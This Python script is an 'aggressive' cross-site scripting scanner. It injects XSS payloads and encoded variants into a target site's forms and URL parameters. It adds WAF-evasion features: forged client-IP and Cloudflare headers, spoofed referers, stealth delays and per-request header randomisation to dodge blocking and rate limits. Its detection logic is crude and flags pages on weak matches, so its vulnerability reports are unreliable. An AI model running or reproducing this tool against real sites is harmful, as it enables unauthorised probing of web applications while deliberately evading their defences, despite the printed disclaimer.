#!/usr/bin/env python3
"""
AGGRESSIVE XSS SCANNER – Advanced reflected, DOM-based, and blind XSS detection
- Enhanced payload evasion: encoding, case variation, filter bypasses
- Multiple injection points: forms, URL params, fragments, DOM nodes
- Intelligent detection: reflection, encoding bypass, DOM state analysis
- Comprehensive reporting with vulnerability classification
"""

import requests
import random
import time
import argparse
import sys
import logging
import re
import base64
import urllib.parse
import socket
import ssl
import json
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote, unquote
from bs4 import BeautifulSoup
from typing import List, Dict, Tuple, Set
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Fix encoding issues on Windows
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
# Create results directory if not exists
RESULTS_DIR = Path("scan_results")
RESULTS_DIR.mkdir(exist_ok=True)

# ----------------------------------------------------------------------
# 0. Result Export Functions
# ----------------------------------------------------------------------
def save_results(results: List[Dict], url: str, args) -> str:
    """Save scan results to JSON and HTML files and return the JSON filepath"""
    if not results:
        return None

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    domain = urlparse(url).netloc.replace('.', '_').replace(':', '-')
    base_name = f"{domain}_{timestamp}"

    # Save JSON
    json_file = RESULTS_DIR / f"{base_name}.json"
    json_data = {
        "scan_time": datetime.now().isoformat(),
        "target_url": url,
        "scan_mode": args.mode,
        "total_vulnerabilities": len(results),
        "vulnerabilities": results,
        "scan_options": {
            "stealth": args.stealth,
            "aggressive_waf": args.aggressive_waf,
            "geo_spoof": args.geo_spoof
        }
    }

    with open(json_file, "w", encoding="utf-8") as f:
        json.dump(json_data, f, indent=2, ensure_ascii=False)

    # Save HTML
    html_file = RESULTS_DIR / f"{base_name}.html"
    html_content = generate_html_report(results, url, json_data)
    with open(html_file, "w", encoding="utf-8") as f:
        f.write(html_content)

    print(f"\n[+] Results saved:")
    print(f"    JSON: {json_file}")
    print(f"    HTML: {html_file}")

    return str(json_file)


def generate_html_report(results: List[Dict], url: str, json_data: Dict) -> str:
    """Generate a simple HTML report from results"""
    html = f"""<!doctype html>
<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n<title>XSS Scan Report - {url}</title>\n<style>body{{font-family:Arial,Helvetica,sans-serif;background:#f6f8fa;color:#222}}.wrap{{max-width:980px;margin:24px auto;padding:18px;background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.06)}}h1{{font-size:20px;color:#c62828}}pre{{white-space:pre-wrap;word-break:break-word;background:#f4f4f4;padding:8px;border-radius:4px}}</style>\n</head>\n<body>\n<div class=\"wrap\">\n<h1>🛡️ XSS Scan Report</h1>\n<p><strong>Target:</strong> {url}</p>\n<p><strong>Scan Time:</strong> {json_data['scan_time']}</p>\n<p><strong>Mode:</strong> {json_data['scan_mode']}</p>\n<p><strong>Vulnerabilities Found:</strong> {json_data['total_vulnerabilities']}</p>\n<hr/>\n"""

    for idx, vuln in enumerate(results, 1):
        html += f"<h2>#{idx} - {vuln.get('point_type','UNKNOWN').upper()}</h2>\n"
        html += f"<p><strong>URL:</strong> {vuln.get('url')}</p>\n"
        html += f"<p><strong>Parameters:</strong> {', '.join(vuln.get('params', []))}</p>\n"
        html += f"<p><strong>Method:</strong> {vuln.get('method')}</p>\n"
        html += f"<p><strong>Detection:</strong> {vuln.get('detection_method')}</p>\n"
        if vuln.get('bypasses'):
            html += f"<p><strong>Bypasses:</strong> {', '.join(vuln.get('bypasses'))}</p>\n"
        html += f"<p><strong>Payload:</strong></p><pre>{vuln.get('payload')}</pre>\n"
        html += f"<p><strong>Snippet:</strong></p><pre>{vuln.get('snippet','')[:800]}</pre>\n<hr/>\n"

    html += f"<footer><p>Report generated: {datetime.now().isoformat()}</p></footer>\n</div>\n</body>\n</html>"
    return html


# ----------------------------------------------------------------------
# 1. Load payloads from file + Generate variants
# ----------------------------------------------------------------------
def load_payloads(mode="reflected", max_payloads: int = 0):
    file_path = "payloads.txt" if mode == "reflected" else "payload2.txt"
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        print(f"[+] Loaded {len(payloads)} payloads from {file_path}")
        
        # Generate additional variants for common payloads
        variants = generate_payload_variants(payloads)
        all_payloads = payloads + variants
        
        if len(all_payloads) == 0:
            print(f"    WARNING: {file_path} is empty! Using fallback payloads.")
            all_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ]
        
        print(f"[+] Total payloads after variant generation: {len(all_payloads)}")
        if max_payloads and max_payloads > 0:
            limited = all_payloads[:max_payloads]
            print(f"[+] Limiting payloads to first {len(limited)} for quick test")
            return limited
        return all_payloads
    except FileNotFoundError:
        print(f"    ERROR: {file_path} not found! Using fallback payloads.")
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
    except Exception as e:
        print(f"    ERROR reading payloads: {e}")
        return ["<script>alert('XSS')</script>"]

def generate_payload_variants(payloads: List[str]) -> List[str]:
    """Generate evasion variants from base payloads"""
    variants = []
    for p in payloads[:50]:  # Limit to first 50 for performance
        # Skip if too short or already complex
        if len(p) < 10 or "data:text" in p or "http://" in p:
            continue
        
        # Case variation
        variants.append(p.replace("script", "ScRiPt").replace("img", "ImG").replace("svg", "SvG"))
        
        # HTML entity encoding
        if "alert" in p:
            variants.append(p.replace("alert", "&#97;&#108;&#101;&#114;&#116;"))
        
        # Unicode escape
        if len(p) < 100:
            variants.append(p.replace("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074"))
    
    return variants

# ----------------------------------------------------------------------
# 2a. Advanced detection methods
# ----------------------------------------------------------------------
def detect_xss_reflection(payload: str, response_text: str) -> Tuple[bool, str]:
    """Detect if payload is reflected in response"""
    # Direct reflection
    if payload in response_text:
        return True, "Direct reflection"
    
    # Check encoded variations
    encoded_variations = [
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace('"', "&quot;").replace("'", "&#x27;"),
        urllib.parse.quote(payload),
        base64.b64encode(payload.encode()).decode(),
    ]
    
    for variant in encoded_variations:
        if variant in response_text:
            return True, f"Encoded reflection: {variant[:50]}"
    
    # Check if key XSS markers are present
    xss_markers = [
        ("alert", "alert function detected"),
        ("<script", "script tag detected"),
        ("onerror", "event handler detected"),
        ("onload", "onload handler detected"),
    ]
    
    for marker, desc in xss_markers:
        if marker.lower() in payload.lower() and marker.lower() in response_text.lower():
            return True, f"Partial XSS pattern: {desc}"
    
    return False, "Not found"

def detect_dom_xss(payload: str, response_text: str) -> Tuple[bool, str]:
    """Detect DOM-based XSS vectors"""
    # Check for dangerous sink functions
    sinks = [
        "innerHTML", "outerHTML", "insertAdjacentHTML", "eval",
        "setTimeout", "setInterval", "Function", "document.write"
    ]
    
    # Check if dangerous sinks exist and payload could affect DOM
    for sink in sinks:
        if sink in response_text and any(marker in payload.lower() for marker in ["script", "onerror", "onload", "javascript"]):
            return True, f"DOM sink detected: {sink}"
    
    return False, "No DOM sinks found"

def detect_attribute_context(payload: str, response_text: str) -> Tuple[bool, str]:
    """Detect if payload breaks out of attribute context"""
    # Look for payload parts in attribute-like contexts
    if (('="' in response_text or "='" in response_text) and 
        any(p in response_text.lower() for p in payload.lower().split())):
        return True, "Attribute context breakout potential"
    return False, "Not in attribute context"

def check_filter_bypass(payload: str, response_text: str) -> List[str]:
    """Detect which filters might have been bypassed"""
    bypasses = []
    
    # Case variation bypass
    if any(c.isupper() for c in payload) and re.search(payload, response_text, re.IGNORECASE):
        bypasses.append("case-variation bypass")
    
    # Encoding bypass
    if "%2F" in payload or "&#" in payload or "\\u" in payload:
        bypasses.append("encoding bypass")
    
    # Null byte bypass
    if "%00" in payload or "\\x00" in payload:
        bypasses.append("null-byte bypass")
    
    # Whitespace bypass
    if any(ws in payload for ws in ["\n", "\r", "\t", "&#9;", "&#10;", "&#13;"]):
        bypasses.append("whitespace bypass")
    
    return bypasses

# ----------------------------------------------------------------------
# 2. Advanced WAF Evasion & Session Setup
# ----------------------------------------------------------------------
def random_headers(geo_spoof=False):
    """Generate realistic headers with WAF evasion and optional geo-spoofing"""
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
        ]),
        # WAF Evasion: Randomized forwarding headers
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "X-Forwarded-Proto": random.choice(["http", "https"]),
        "X-Forwarded-Host": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Originating-IP": f"[{'.'.join(str(random.randint(1, 255)) for _ in range(4))}]",
        "X-Forwarded-Server": f"server{random.randint(1,100)}.local",
        "X-Real-IP": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "X-Client-IP": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        # Standard headers
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.7", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": random.choice(["keep-alive", "upgrade"]),
        "Upgrade-Insecure-Requests": "1",
        # Cache busting
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        # Referer spoofing
        "Referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"]),
        # Browser fingerprinting evasion
        "Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"']),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }
    # Geo-spoofing headers
    if geo_spoof:
        headers["Cf-Ipcountry"] = random.choice(["US", "GB", "DE", "CA", "AU", "NG"])
        headers["Cf-Connecting-IP"] = ".".join(str(random.randint(1, 255)) for _ in range(4))
    return headers

def setup_resilient_session(proxy=None, retries=3, backoff=0.5):
    """Setup session with automatic retry, resilience to rate limiting, and connection pooling"""
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session

# ----------------------------------------------------------------------
# 3. Discover injection points (forms + URL params + fragments)
# ----------------------------------------------------------------------
def discover_injection_points(base_url, session, timeout, geo_spoof=False):
    """Discover all injection points: forms, URL params, fragments"""
    points = []
    
    try:
        print(f"[+] Fetching: {base_url}")
        session.headers.update(random_headers(geo_spoof=geo_spoof))
        time.sleep(random.uniform(0.5, 1.5))
        
        r = session.get(base_url, timeout=timeout, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        
        # 1. Discover forms
        for f in soup.find_all("form"):
            action = f.get("action") or ""
            method = f.get("method", "get").upper()
            inputs = [i.get("name") for i in f.find_all("input") if i.get("name")]
            if inputs:
                full_url = urljoin(base_url, action) if action else base_url
                points.append({
                    "type": "form",
                    "url": full_url,
                    "method": method,
                    "params": inputs
                })
                print(f"    [FORM] {method} → {full_url}")
                print(f"        Inputs: {', '.join(inputs)}")
        
        # 2. Discover URL parameters
        parsed = urlparse(base_url)
        if parsed.query:
            url_params = list(parse_qs(parsed.query).keys())
            if url_params:
                points.append({
                    "type": "url_param",
                    "url": base_url,
                    "method": "GET",
                    "params": url_params
                })
                print(f"    [URL PARAM] GET → {base_url}")
                print(f"        Parameters: {', '.join(url_params)}")
        
        # 3. Discover URL fragments (if app uses them)
        if parsed.fragment:
            points.append({
                "type": "fragment",
                "url": base_url,
                "method": "GET",
                "params": [parsed.fragment]
            })
            print(f"    [FRAGMENT] GET → #{parsed.fragment}")
        
        # 4. Common parameter injection points (even if not in current URL)
        # Test common parameter names that XSS often targets
        common_params = ["q", "search", "keyword", "id", "name", "email", "msg", 
                         "message", "comment", "text", "input", "query", "term",
                         "page", "url", "link", "next", "redirect", "return", "callback"]
        
        # Check if any of these common params might be injectable
        # by attempting to inject into the URL and seeing if the site responds
        for param in common_params[:5]:  # Test first 5 common params
            test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}=test_xss_marker_12345"
            try:
                session.headers.update(random_headers(geo_spoof=geo_spoof))
                time.sleep(random.uniform(0.2, 0.8))
                test_resp = session.get(test_url, timeout=timeout, verify=False)
                if f"test_xss_marker_12345" in test_resp.text:
                    points.append({
                        "type": "url_param",
                        "url": base_url,
                        "method": "GET",
                        "params": [param],
                        "discovered": "common_param"
                    })
                    print(f"    [URL PARAM] GET → {param} (common parameter)")
            except:
                pass
        
        if not points:
            print("    No injection points found.")
            print("    [INFO] Site may have:")
            print("           - No HTML forms")
            print("           - No URL parameters")
            print("           - JavaScript-based forms (SPA)")
            print("           - Rate limiting or blocking bot requests")
        
        return points
    except Exception as e:
        print(f"    Error: {e}")
        return []

# ----------------------------------------------------------------------
# 4. Build injected payloads with multiple injection techniques
# ----------------------------------------------------------------------
def build_injected(url, payload, params, method, injection_type="form"):
    """Build injected URL/data with various injection techniques"""
    if method == "GET":
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        
        # Inject payload into each parameter
        for p in params:
            if injection_type == "fragment":
                # Fragment injection
                return url.split('#')[0] + f"#{payload}", None
            else:
                # Standard parameter injection
                qs[p] = [payload]
        
        injected_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
        return injected_url, None
    else:
        # POST injection
        return url, {p: payload for p in params}

# ----------------------------------------------------------------------
# 5. Scan injection point with advanced detection
# ----------------------------------------------------------------------
def scan_injection_point(point, session, payloads, timeout, delay, mode="reflected", geo_spoof=False, aggressive_waf=True):
    """Scan injection point with multiple detection techniques and advanced WAF evasion"""
    results = []
    url = point["url"]
    method = point["method"]
    params = point["params"]
    point_type = point.get("type", "form")

    print(f"\n[*] Scanning {point_type.upper()} {method} {url}")
    print(f"    Parameters: {', '.join(params[:3])}{'...' if len(params) > 3 else ''}")
    print(f"    Payloads to test: {len(payloads)}")
    print(f"    WAF Evasion: {'ENABLED (per-request randomization)' if aggressive_waf else 'BASIC'}")

    consecutive_blocks = 0
    for i, payload in enumerate(payloads, 1):
        # Dynamic delay with WAF evasion
        if isinstance(delay, (list, tuple)):
            base_delay = random.uniform(*delay)
        else:
            base_delay = delay
        
        # Add extra delay if we're hitting rate limits / blocks
        if consecutive_blocks > 2:
            extra_delay = min(base_delay * (consecutive_blocks // 2), 10)
            if (i - 1) % 50 == 0:  # Print every 50 payloads
                print(f"\n    [!] Rate limiting detected, adding {extra_delay:.1f}s delay...")
            time.sleep(extra_delay)
            consecutive_blocks = 0
        else:
            time.sleep(base_delay)
        
        # Randomize headers for EVERY request (aggressive WAF evasion)
        if aggressive_waf:
            session.headers.update(random_headers(geo_spoof=geo_spoof))
        
        # Display progress
        payload_display = payload[:55].replace("\n", "\\n")
        print(f"  [{i:4d}/{len(payloads)}] {payload_display}...", end="", flush=True)

        try:
            inj_url, data = build_injected(url, payload, params, method, point_type)
            
            # Make request with SSL verification disabled
            if method == "GET":
                resp = session.get(inj_url, timeout=timeout, allow_redirects=True, verify=False)
            else:
                resp = session.post(inj_url, data=data, timeout=timeout, allow_redirects=True, verify=False)

            # Handle rate limiting and WAF blocks
            if resp.status_code == 429:
                print(f" [429 Rate Limited]", end="")
                consecutive_blocks += 1
                print()
                continue
            elif resp.status_code in [403, 406, 418]:  # Forbidden, Not Acceptable, I'm a Teapot (all WAF indicators)
                print(f" [HTTP {resp.status_code} Blocked]", end="")
                consecutive_blocks += 1
                print()
                continue
            elif resp.status_code != 200:
                print(f" [HTTP {resp.status_code}]", end="")
                if resp.status_code >= 400:
                    print()
                    continue
                print()
            else:
                consecutive_blocks = 0  # Reset on successful request

            # Advanced detection
            response_text = resp.text
            
            # Method 1: Direct reflection detection
            is_reflected, reflection_method = detect_xss_reflection(payload, response_text)
            
            # Method 2: DOM XSS detection
            is_dom_xss, dom_method = detect_dom_xss(payload, response_text)
            
            # Method 3: Attribute context detection
            is_attribute, attr_method = detect_attribute_context(payload, response_text)
            
            # Method 4: Check filter bypasses
            bypasses = check_filter_bypass(payload, response_text)
            
            # Determine if vulnerable
            if is_reflected or is_dom_xss or is_attribute:
                print(" ✓ VULNERABLE!", end="")
                
                # Store result
                result = {
                    "url": url,
                    "method": method,
                    "params": params,
                    "payload": payload,
                    "status": resp.status_code,
                    "point_type": point_type,
                    "detection_method": reflection_method or dom_method or attr_method,
                    "bypasses": bypasses,
                    "snippet": response_text[:300].replace("\n", " ")
                }
                results.append(result)
                
                # Detailed output
                print(f"\n      Detection: {result['detection_method']}")
                if bypasses:
                    print(f"      Bypasses: {', '.join(bypasses)}")
                print()
            else:
                print(" [-]")
        
        except requests.exceptions.Timeout:
            print(" [TIMEOUT]")
        except requests.exceptions.ConnectionError:
            print(" [CONN ERROR]")
        except Exception as e:
            print(f" [ERROR: {str(e)[:30]}]")

    return results

# ----------------------------------------------------------------------
# 6. Main
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="AGGRESSIVE XSS Scanner – Reflected, DOM-based, and blind XSS detection with filter evasion"
    )
    parser.add_argument("--url", required=True, help="Target URL with potential injection points")
    parser.add_argument("--mode", choices=["reflected", "blind"], default="reflected", help="Scan mode")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (random delays + headers)")
    parser.add_argument("--aggressive-waf", action="store_true", help="Enable aggressive WAF evasion (randomize headers per-request)")
    parser.add_argument("--geo-spoof", action="store_true", help="Enable geo-spoofing to bypass geo-blocking")
    parser.add_argument("--results-dir", default="scan_results", help="Directory to save JSON/HTML results")
    parser.add_argument("--max-payloads", type=int, default=0, help="Limit number of payloads loaded (0 = all)")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    delay = (1.0, 3.0) if args.stealth else args.delay
    if args.stealth:
        print("[*] Stealth mode: random delays + randomized headers")
    if args.aggressive_waf:
        print("[*] Aggressive WAF evasion: randomizing headers per-request + adaptive delays")
    if args.geo_spoof:
        print("[*] Geo-spoofing: enabled (bypassing geo-blocking)")

    # Setup results directory from CLI
    global RESULTS_DIR
    RESULTS_DIR = Path(args.results_dir)
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    # Setup resilient session with automatic retries
    session = setup_resilient_session(proxy=args.proxy, retries=3)
    session.headers.update(random_headers(geo_spoof=args.geo_spoof))
    if args.proxy:
        print(f"[*] Using proxy: {args.proxy}")

    print("\n" + "="*80)
    print("AGGRESSIVE XSS SCANNER - LEGAL DISCLAIMER")
    print("="*80)
    print("WARNING: Only scan sites you own or have EXPLICIT written permission to test.")
    print("Unauthorized testing may violate laws including the Computer Fraud and Abuse Act.")
    print("="*80 + "\n")

    # Load payloads (optionally limit for quick test)
    payloads = load_payloads(args.mode, max_payloads=args.max_payloads)
    if not payloads:
        print("[-] No payloads available. Exiting.")
        return

    # Discover & scan all injection points
    injection_points = discover_injection_points(args.url, session, args.timeout, geo_spoof=args.geo_spoof)
    if not injection_points:
        print("\n[-] No injection points discovered.")
        print("\n[!] TROUBLESHOOTING TIPS:")
        print("    1. Site may be a Single Page App (SPA) - no traditional forms/params")
        print("    2. Site may require authentication or specific headers")
        print("    3. Try with --stealth flag to bypass bot detection")
        print("    4. Try with --aggressive-waf for maximum WAF evasion")
        print("    5. Try with --geo-spoof to bypass geo-blocking")
        print("    6. Try with --proxy to route through Burp Suite for manual inspection")
        print("    7. Use a direct URL with parameters: ?search=test&id=123")
        print("\n[!] Example with full evasion:")
        print(f"    python xssscan.py --url '{args.url}?search=test' --stealth --aggressive-waf --geo-spoof --verbose")
        return

    all_results = []
    for point in injection_points:
        all_results.extend(
            scan_injection_point(point, session, payloads, args.timeout, delay, args.mode, 
                               geo_spoof=args.geo_spoof, aggressive_waf=args.aggressive_waf)
        )

    # Report findings
    print("\n" + "="*80)
    if all_results:
        print(f"[+] VULNERABILITIES FOUND: {len(all_results)}")
        print("="*80 + "\n")
        
        for idx, r in enumerate(all_results, 1):
            print(f"[Vulnerability #{idx}]")
            print(f"  Type: {r['point_type'].upper()}")
            print(f"  URL: {r['url']}")
            print(f"  Method: {r['method']}")
            print(f"  Parameters: {', '.join(r['params'])}")
            print(f"  Payload: {r['payload']}")
            print(f"  Detection: {r['detection_method']}")
            if r['bypasses']:
                print(f"  Filter Bypasses: {', '.join(r['bypasses'])}")
            print(f"  Response Snippet: {r['snippet'][:150]}...")
            print()

        # Save results to JSON and HTML
        try:
            saved = save_results(all_results, args.url, args)
        except Exception as e:
            print(f"[!] Failed to save results: {e}")
            saved = None

        # Summary statistics
        print("\n" + "="*80)
        print("SCAN SUMMARY")
        print("="*80)
        print(f"[+] Total Vulnerabilities: {len(all_results)}")
        print(f"[+] Unique URLs Affected: {len(set(r['url'] for r in all_results))}")
        print(f"[+] Detection Methods Used: {', '.join(set(r.get('detection_method','unknown') for r in all_results))}")
        print(f"[+] Injection Point Types: {', '.join(set(r.get('point_type','unknown') for r in all_results))}")
        if saved:
            print(f"[+] Results JSON saved to: {saved}")
        print("="*80)
    else:
        print("[-] No XSS vulnerabilities detected.")
        print("="*80)
        print("\n[*] Scan completed. No results file generated (no vulnerabilities found).")

if __name__ == "__main__":
    main()